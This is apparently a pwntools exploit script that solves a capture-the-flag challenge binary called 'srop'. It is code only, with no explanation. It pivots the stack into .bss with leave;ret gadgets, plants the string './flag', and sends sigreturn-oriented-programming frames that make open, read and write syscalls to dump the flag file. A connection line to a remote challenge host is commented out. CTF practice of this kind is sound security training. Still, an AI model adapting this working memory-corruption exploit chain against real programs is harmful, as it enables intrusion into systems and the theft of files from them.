from pwn import *
 
context(os='linux', arch='amd64', log_level='debug')
 
 
#io = remote('8.147.132.32', 27991)
io = process('./srop')
 
bss_addr = 0x404a00
 
leave_ret = 0x4012b0
 
read = 0x401349
 
gift = 0x401366
 
syscall = 0x40136D
 
 
payload = b'a'*0x10 + p64(bss_addr) + p64(read)
 
io.send(payload); sleep(0.2)
 
 
 
payload  = p64(bss_addr+0x100) + p64(read)
 
payload += p64(bss_addr-0x10) + p64(leave_ret)
 
payload += b'./flag\x00\x00'
 
io.send(payload); sleep(0.2)
 
 
 
payload  = p64(0)*2 + p64(bss_addr+0x200) + p64(read) + p64(gift)
 
frame = SigreturnFrame()
 
frame.rax = 2
 
frame.rdi = 0x404a10
 
frame.rsi = 0
 
frame.rdx = 0
 
frame.rip = syscall
 
frame.rsp = bss_addr + 0x210
 
payload += bytes(frame)
 
if len(payload) > 0x100: payload = payload[:0x100]
 
io.send(payload); sleep(0.2)
 
 
payload  = p64(0)*2 + p64(bss_addr+0x300) + p64(read) + p64(gift)
 
frame = SigreturnFrame()
 
frame.rax = constants.SYS_read
 
frame.rdi = 3
 
frame.rsi = bss_addr + 0x400
 
frame.rdx = 0x50
 
frame.rip = syscall
 
frame.rsp = bss_addr + 0x310
 
payload += bytes(frame)
 
if len(payload) > 0x100: payload = payload[:0x100]
 
io.send(payload); sleep(0.2)
 
 
payload  = p64(0)*2 + p64(bss_addr+0x108) + p64(leave_ret) + p64(gift)
 
frame = SigreturnFrame()
 
frame.rax = constants.SYS_write
 
frame.rdi = 1
 
frame.rsi = bss_addr + 0x400
 
frame.rdx = 0x50
 
frame.rip = syscall
 
payload += bytes(frame)
 
if len(payload) > 0x100: payload = payload[:0x100]
 
io.send(payload); sleep(0.2)
 
 
io.interactive()
